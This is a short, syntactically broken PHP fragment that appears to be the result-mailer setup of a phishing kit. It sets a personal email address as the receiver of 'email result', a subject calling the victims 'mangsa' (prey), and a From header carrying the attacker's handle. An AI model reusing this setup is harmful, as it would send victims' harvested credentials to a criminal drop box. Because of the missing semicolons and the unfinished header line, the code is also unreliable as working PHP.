<?php
$email = "esdnaomi@gmail.com" /* email result */
$subject = "Mangsa Gan Degan [Demeter_16][Achon666ju5t - LadyViona]"
$headers = 'From: Achon666ju5t@Demeter_16' . "\r\n" .
?>